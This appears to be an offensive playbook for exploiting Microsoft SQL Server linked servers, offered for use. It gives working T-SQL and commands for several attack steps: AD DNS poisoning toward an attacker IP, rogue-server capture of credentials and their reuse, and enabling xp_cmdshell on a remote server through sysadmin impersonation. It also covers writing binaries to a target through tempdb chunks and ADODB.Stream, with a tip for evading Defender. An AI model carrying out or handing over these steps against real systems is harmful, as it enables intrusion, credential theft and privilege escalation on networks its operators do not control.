# MSSQL Linked Server Exploitation

## When this applies

- MSSQL access obtained (via hardcoded creds in binaries, config files, or SQLi).
- Check for linked servers immediately.
- Goal: pivot through linked servers — including remote sysadmin via `EXEC AT` + `EXECUTE AS LOGIN='sa'`.

## Escalation Ladder

1. **Enumerate linked servers** — `SELECT * FROM sys.servers WHERE is_linked = 1;` or `EXEC sp_linkedservers;`. Note server names, provider strings, data sources.
2. **Test linked server connectivity** — `EXEC sp_testlinkedserver @servername;`. Errors like "could not resolve hostname" indicate the target is unreachable — this is an opportunity.
3. **AD DNS poisoning** — if a linked server points to an unresolvable hostname and you have domain user credentials, any authenticated domain user can create DNS A records in AD-integrated DNS zones. Use `bloodyAD` or `dnstool.py` (from krbrelayx) to point the hostname to your attacker IP: `bloodyAD -d domain.local -u user -p pass --host DC_IP add dnsRecord <hostname> <attacker_IP>`. Wait for DNS propagation (~30-60s).
4. **Rogue service credential capture** — set up a rogue server matching the linked server's protocol (MSSQL TDS on 1433). When the linked server connection fires, credentials are sent automatically. For MSSQL: parse TDS Login7 packets — SQL auth credentials are transmitted in cleartext (username at offset 94+, password with simple XOR obfuscation). Tools: `responder` (multi-protocol), Impacket's `mssqlserver.py`.
5. **Trigger the connection** — linked server queries may run on schedule, or trigger manually: `EXEC ('SELECT 1') AT [LinkedServerName];`
6. **Use captured credentials** — test against WinRM (`evil-winrm`), SMB (`crackmapexec`), RDP, and other services for password reuse.
7. **Cross-server `EXEC ('...') AT [SRV]` + remote `EXECUTE AS LOGIN='sa'` for RCE on the linked target** — when `is_data_access_enabled=1` AND `is_rpc_out_enabled=1` on a linked server AND the linked-login on the remote is sysadmin (mapped via `sp_addlinkedsrvlogin` with a fixed remote login), you can run arbitrary T-SQL on the remote with sysadmin context — even if your local login has zero local privileges.

   ```sql
   -- All-in-one: enable xp_cmdshell remotely + run command as remote SQL service account
   EXEC ('EXECUTE AS LOGIN = ''sa'';
          EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
          EXEC sp_configure ''xp_cmdshell'',          1; RECONFIGURE;
          EXEC xp_cmdshell ''whoami /priv > C:\Users\Public\out.txt'' ') AT [TargetSrv];
   -- Single-quote escaping: each level of nesting doubles. AT [Srv] sends the literal
   -- string TO the remote, where it parses as fresh T-SQL.
   ```

   This pattern bypasses local sysadmin restrictions completely — you DO NOT need sysadmin on your foothold SQL host. Useful when a forged-SAML/web session lands you as a low-priv DB login but the application config exposes a `bridge_*`-style linked server pointing at the real database tier (often a forest-internal SQL on a privileged DC).
   - Use `;` between statements inside the bracketed string. Multi-statement batches work fine.
   - For data exfil rather than RCE: `EXEC ('SELECT name FROM sys.databases') AT [Srv]` returns rows directly through the linked server.
   - To check what you can do remotely: `EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [Srv]`.

## Bulk binary upload via SQL `tempdb` chunked INSERT + `ADODB.Stream.SaveToFile`

When xp_cmdshell is available but the target has no inbound HTTP/SMB egress (typical on a hardened DC reached via linked-server pivot), `xp_cmdshell echo BASE64 >>` corrupts binaries (line-length limits, encoding glitches) and `certutil -urlcache` fails with no internet. The reliable path is to write the binary into `tempdb.dbo.<table>` as `varbinary(max)` chunks via INSERT, then concatenate via OLE Automation `ADODB.Stream`:

```sql
-- 1) Stage table
EXEC ('USE tempdb; CREATE TABLE dbo.up (id int identity, b varbinary(max))') AT [Srv];

-- 2) Loop INSERT 8000-byte hex chunks. From the attacker side, generate:
--    INSERT INTO tempdb.dbo.up VALUES (0x4d5a90...);
-- One chunk per query (avoids 4000-char nvarchar literal limits).

-- 3) Concatenate with ADODB.Stream and save to disk as binary
EXEC ('
  DECLARE @s int, @hr int, @i int = 1, @count int;
  EXEC sp_OACreate ''ADODB.Stream'', @s OUT;
  EXEC sp_OAMethod @s, ''Open'';
  EXEC sp_OASetProperty @s, ''Type'', 1;             -- 1 = binary
  SELECT @count = COUNT(*) FROM tempdb.dbo.up;
  WHILE @i <= @count BEGIN
    DECLARE @chunk varbinary(max);
    SELECT @chunk = b FROM tempdb.dbo.up WHERE id = @i;
    EXEC sp_OAMethod @s, ''Write'', NULL, @chunk;
    SET @i = @i + 1;
  END;
  EXEC sp_OAMethod @s, ''SaveToFile'', NULL, ''C:\Users\Public\out.exe'', 2;   -- 2 = overwrite
  EXEC sp_OADestroy @s;
') AT [Srv];

-- 4) Cleanup
EXEC ('DROP TABLE tempdb.dbo.up') AT [Srv];
```

For ~30 KB potato binaries, ~4 chunks is enough. For larger payloads, drive the chunking from a Python helper that reads the source binary, hex-encodes 8000-byte slices, and emits one `INSERT` per slice. The `ADODB.Stream` write-and-save is **single-shot** — Defender catches the binary the moment it lands on disk; **always upload `.cs` source + compile with csc.exe** instead of uploading compiled `.exe` whenever possible.

## Verifying success

- `EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [Srv]` returns `1` confirming sysadmin on the linked target.
- `xp_cmdshell` runs on the linked target with the service account's identity.

## Common pitfalls

- Single-quote escaping at `EXEC AT` boundary doubles per nesting level — keep it simple, two levels max.
- ADODB.Stream upload writes the binary to disk where Defender catches it — prefer source upload + on-target csc.exe compile.

## Tools

- impacket `mssqlclient.py`
- bloodyAD / dnstool.py (DNS poisoning)
- responder / impacket `mssqlserver.py` (rogue capture)
